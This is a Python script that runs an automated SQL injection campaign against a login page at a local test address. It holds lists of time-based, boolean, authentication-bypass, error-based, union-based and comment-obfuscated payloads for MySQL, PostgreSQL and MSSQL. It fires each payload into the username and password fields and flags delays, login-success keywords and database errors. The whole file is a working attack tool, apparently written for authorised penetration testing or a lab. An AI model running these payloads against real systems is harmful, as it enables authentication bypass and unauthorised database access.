import requests
import time
import json
from datetime import datetime

# Configuration
BASE_URL = "http://127.0.0.1:33168"
LOGIN_ENDPOINT = "/login.php"
TIMEOUT = 10
NORMAL_RESPONSE_TIME_THRESHOLD = 2.0  # Responses under 2s considered normal
DELAYED_RESPONSE_TIME_THRESHOLD = 3.0  # Responses over 3s indicate potential time-based SQLi

# Initialize session
session = requests.Session()
session.headers.update({
    'User-Agent': 'SQLi-Test-Suite/1.0',
    'Content-Type': 'application/x-www-form-urlencoded'
})

# Payload Categories
payloads = {
    "time_based_mysql": [
        "admin' OR SLEEP(3)-- ",
        "admin' OR IF(1=1,SLEEP(3),0)-- ",
        "admin' UNION SELECT SLEEP(3)-- ",
        "admin' AND SLEEP(3)-- ",
    ],
    "time_based_postgresql": [
        "admin' OR pg_sleep(3)-- ",
        "admin' UNION SELECT pg_sleep(3)-- ",
    ],
    "time_based_mssql": [
        "admin'; WAITFOR DELAY '0:0:3'-- ",
    ],
    "boolean_based": [
        "' OR '1'='1'-- ",
        "' OR '1'='1'#",
        "admin'-- ",
        "' OR 1=1-- ",
        "' OR 1=1#",
        "' OR '1'='1'/*",
        "admin' #",
    ],
    "auth_bypass": [
        "' OR 1=1-- ",
        "' OR '1'='1'-- ",
        "admin'-- ",
        "' OR username='admin'-- ",
        "' OR 1=1 LIMIT 1-- ",
        "' OR 1=1-- -",
        "' OR '1'='1'/*",
        "' OR 1=1#",
        "admin' #",
    ],
    "error_based": [
        "' OR (SELECT 1 FROM (SELECT SLEEP(5))A)-- ",
        "1' AND (SELECT*FROM(SELECT+SLEEP(5))a)-- ",
        "' UNION SELECT 1/0-- ",
        "' AND (SELECT 1 FROM (SELECT 1)a WHERE 1=1/0)-- ",
    ],
    "union_based": [
        "' UNION SELECT 1,2-- ",
        "' UNION SELECT NULL,NULL-- ",
        "' UNION SELECT 1,2,3-- ",
        "' UNION SELECT NULL,NULL,NULL-- ",
        "' UNION SELECT @@version,2-- ",
        "' UNION SELECT user(),database()-- ",
    ],
    "advanced_bypass": [
        "'/**/OR/**/'1'='1'-- ",
        "' OR/**/1=1-- ",
        "admin'/**/-- ",
        "'||'1'='1'-- ",
        "' OR '1'='1'-- -",
        "admin'-- -",
    ]
}

# Results tracking
results = {
    "total_payloads_tested": 0,
    "response_time_anomalies": [],
    "different_response_patterns": {},
    "successful_payloads": [],
    "baseline_response": None
}

# Get baseline for normal login attempt
print("[+] Getting baseline response time for normal login attempt...")
try:
    start_time = time.time()
    response = session.post(
        f"{BASE_URL}{LOGIN_ENDPOINT}",
        data={"username": "normaluser", "password": "normalpass"},
        timeout=TIMEOUT
    )
    end_time = time.time()
    baseline_time = end_time - start_time
    results["baseline_response"] = baseline_time
    print(f"[+] Baseline response time: {baseline_time:.3f} seconds")
    print(f"[+] Baseline response status: {response.status_code}")
    print(f"[+] Baseline response length: {len(response.text)} bytes")
    print(f"[+] Baseline response snippet: {response.text[:200]}\n")
except Exception as e:
    print(f"[!] Error getting baseline: {e}\n")
    baseline_time = 1.0

# Test function
def test_payload(payload, test_type="username_only"):
    """Test a payload in different field combinations"""
    results["total_payloads_tested"] += 1
    
    if test_type == "username_only":
        data = {"username": payload, "password": ""}
    elif test_type == "password_only":
        data = {"username": "", "password": payload}
    else:  # both fields
        data = {"username": payload, "password": payload}
    
    try:
        start_time = time.time()
        response = session.post(
            f"{BASE_URL}{LOGIN_ENDPOINT}",
            data=data,
            timeout=TIMEOUT
        )
        end_time = time.time()
        response_time = end_time - start_time
        
        # Analyze response
        result_entry = {
            "payload": payload,
            "test_type": test_type,
            "response_time": response_time,
            "status_code": response.status_code,
            "response_length": len(response.text),
            "response_snippet": response.text[:300].replace('\n', ' ').replace('\r', ' '),
            "timestamp": datetime.now().isoformat()
        }
        
        # Check for time-based anomalies
        if response_time >= DELAYED_RESPONSE_TIME_THRESHOLD:
            anomaly = {
                **result_entry,
                "anomaly_type": "TIME_DELAY",
                "delay_seconds": response_time
            }
            results["response_time_anomalies"].append(anomaly)
            results["successful_payloads"].append({
                "type": "TIME_BASED",
                **result_entry
            })
            print(f"[!] TIME DELAY DETECTED: {payload[:50]}... ({test_type})")
            print(f"    Response time: {response_time:.3f}s | Status: {response.status_code}")
        
        # Check for significant response length differences
        if results["baseline_response"] and baseline_time > 0:
            length_ratio = len(response.text) / len(session.get(f"{BASE_URL}{LOGIN_ENDPOINT}").text) if len(session.get(f"{BASE_URL}{LOGIN_ENDPOINT}").text) > 0 else 1
            
            # Check for unusual patterns
            key = f"{response.status_code}_{len(response.text)}"
            if key not in results["different_response_patterns"]:
                results["different_response_patterns"][key] = {
                    "status_code": response.status_code,
                    "length": len(response.text),
                    "example_payload": payload,
                    "example_response": response.text[:300]
                }
        
        # Check for auth success indicators
        success_indicators = ["welcome", "dashboard", "logged in", "success", "home", 
                            "logout", "profile", "admin", "control panel"]
        response_lower = response.text.lower()
        
        if any(indicator in response_lower for indicator in success_indicators):
            results["successful_payloads"].append({
                "type": "AUTH_BYPASS",
                **result_entry
            })
            print(f"[!] AUTH BYPASS POSSIBLE: {payload[:50]}... ({test_type})")
            print(f"    Status: {response.status_code} | Length: {len(response.text)} bytes")
        
        # Check for error messages
        error_patterns = ["sql", "syntax", "mysql", "postgresql", "mssql", "database", 
                         "error", "exception", "parse", "invalid"]
        error_found = any(pattern in response_lower for pattern in error_patterns)
        
        if error_found and response.status_code >= 400:
            results["successful_payloads"].append({
                "type": "ERROR_BASED",
                **result_entry
            })
            print(f"[!] ERROR MESSAGE: {payload[:50]}... ({test_type})")
            print(f"    Status: {response.status_code} | Error in response")
        
        return result_entry
        
    except requests.Timeout:
        print(f"[!] TIMEOUT with payload: {payload[:50]}... ({test_type})")
        return {
            "payload": payload,
            "test_type": test_type,
            "response_time": TIMEOUT,
            "status_code": "TIMEOUT",
            "error": "Request timed out"
        }
    except Exception as e:
        print(f"[!] ERROR with payload: {payload[:50]}... ({test_type})")
        print(f"    Error: {str(e)}")
        return {
            "payload": payload,
            "test_type": test_type,
            "error": str(e)
        }

# Run comprehensive tests
print(f"[+] Starting comprehensive SQL injection testing suite")
print(f"[+] Target: {BASE_URL}{LOGIN_ENDPOINT}")
print(f"[+] Testing {sum(len(payloads[cat]) for cat in payloads)} payloads across all categories\n")

for category, category_payloads in payloads.items():
    print(f"\n[=== {category.upper().replace('_', ' ')} ===]")
    
    for payload in category_payloads:
        # Test in username field only
        test_payload(payload, "username_only")
        
        # Test in password field only
        test_payload(payload, "password_only")
        
        # Test in both fields
        test_payload(payload, "both_fields")

# Calculate statistics
print("\n" + "="*80)
print("COMPREHENSIVE SQL INJECTION TEST RESULTS")
print("="*80)

print(f"\n[1] TOTAL PAYLOADS TESTED: {results['total_payloads_tested']}")

print(f"\n[2] RESPONSE TIME ANOMALIES:")
if results['response_time_anomalies']:
    print(f"    Found {len(results['response_time_anomalies'])} anomalies:")
    for idx, anomaly in enumerate(results['response_time_anomalies'][:5], 1):
        print(f"    {idx}. Time: {anomaly['delay_seconds']:.3f}s | {anomaly['test_type']}")
        print(f"       Payload: {anomaly['payload'][:60]}...")
        print(f"       Status: {anomaly['status_code']} | Length: {anomaly['response_length']} bytes\n")
else:
    print("    No time-based anomalies detected")

print(f"\n[3] DIFFERENT RESPONSE PATTERNS FOUND:")
for pattern_key, pattern in results['different_response_patterns'].items():
    print(f"    Pattern: Status {pattern['status_code']} | Length {pattern['length']} bytes")
    print(f"    Example Payload: {pattern['example_payload'][:60]}...")
    print(f"    Response snippet: {pattern['example_response'][:100]}...\n")

print(f"\n[4] SUCCESSFUL/AFFECTED PAYLOADS:")
if results['successful_payloads']:
    print(f"    Found {len(results['successful_payloads'])} potentially successful payloads:")
    success_by_type = {}
    for success in results['successful_payloads']:
        if success['type'] not in success_by_type:
            success_by_type[success['type']] = []
        success_by_type[success['type']].append(success)
    
    for s_type, payloads_list in success_by_type.items():
        print(f"\n    [{s_type}]: {len(payloads_list)} payloads")
        for idx, p in enumerate(payloads_list[:3], 1):
            print(f"    {idx}. {p['test_type']}")
            print(f"       Payload: {p['payload'][:60]}...")
            print(f"       Time: {p['response_time']:.3f}s | Status: {p['status_code']}")
else:
    print("    No successful payloads detected")

print(f"\n[5] BASELINE COMPARISON:")
if results['baseline_response']:
    print(f"    Baseline response time: {results['baseline_response']:.3f}s")

print("\n" + "="*80)
